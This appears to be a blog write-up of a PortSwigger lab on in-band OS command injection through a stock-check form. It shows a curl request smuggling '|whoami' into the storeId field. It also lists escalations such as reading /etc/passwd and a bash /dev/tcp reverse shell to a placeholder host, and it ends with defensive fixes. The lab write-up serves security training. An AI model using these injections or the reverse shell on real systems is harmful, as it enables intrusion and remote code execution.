---
layout: post
title: "PortSwigger: OS Command Injection, Simple Case"
date: 2027-09-16 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, CommandInjection]
tags: [portswigger, os-command-injection, command-injection, shell, whoami, in-band, cwe-78]
---

A shop page has a harmless-looking "Check stock" button. Click it and the server quietly builds an **operating-system shell command** out of the product and store IDs you submitted — and runs it. This lab is the textbook *simple case*: the store ID is pasted straight into that command line, and the command's output is handed right back to you in the HTTP response. That makes it the friendliest possible flavour of [OS command injection](https://cwe.mitre.org/data/definitions/78.html) — no callbacks, no time delays, you just read the answer.

## Overview

The lab is a single in-band (non-blind) [OS command injection](https://cwe.mitre.org/data/definitions/78.html) ([CWE-78](https://cwe.mitre.org/data/definitions/78.html)). The stock checker on a product page sends `productId` and `storeId` to `POST /product/stock`, the server splices `storeId` into a shell command without sanitising it, and the command's standard output is reflected in the response body. Injecting a shell pipe runs an arbitrary command and shows its result — the objective is to run `whoami`.

## The technique

When a server builds a command line like:

```
stockreport.pl <productId> <storeId>
```

and runs it through a **shell**, the shell treats certain characters as control characters rather than data. The pipe `|` is one of them: it ends the current command and feeds its output into a new command. So a `storeId` of `1|whoami` is no longer "store number one" — it is "run a command with `1`, then run `whoami`". Because this app echoes the command output back to the browser, you read the result directly; this is the *in-band* / non-blind case, distinct from blind variants that need a time delay or an out-of-band DNS callback.

## Solution

The stock check is a simple form POST with two fields. Append `|whoami` to the store ID:

```bash
curl -sk -X POST "https://TARGET/product/stock" \
  --data-urlencode "productId=1" \
  --data-urlencode "storeId=1|whoami"
```

Response body:

```
peter-isfdRw
```

That is the output of `whoami` — the OS account the web server runs as. The lab flips to **Solved** the instant the injected command executes.

If `|` is filtered, the same idea works with other shell separators — `;`, `&`, `&&`, backticks `` `cmd` ``, or `$(cmd)` — and you escalate `whoami` to anything: `id`, `cat /etc/passwd`, or a reverse shell (`bash -c 'bash -i >& /dev/tcp/<lhost>/<lport> 0>&1'`) for full remote code execution.

## Why it worked

The application passed user input through a **shell**, and the shell interpreted the pipe metacharacter. `1|whoami` ran a command with the value `1` and piped its output into `whoami`. Because the app reflects the command's stdout in the HTTP response, the result of the [command injection](https://cwe.mitre.org/data/definitions/78.html) is visible immediately — no out-of-band channel required. The root cause is mixing untrusted data with command syntax in the same string.

## Fix / defense

1. **Don't call a shell at all.** Use an API that takes the program and its arguments as a list, so the OS never re-parses your data as command syntax:

   ```python
   subprocess.run(["stockreport.pl", product_id, store_id])  # no shell=True
   ```

2. **Validate input strictly.** A store ID should be an integer — reject anything that isn't `^\d+$` *before* it reaches a command.
3. **Least privilege.** Run the service as an unprivileged account so even a successful injection is contained.

Keep data and command syntax separate (parameterised calls + allowlist validation) and the entire class disappears.
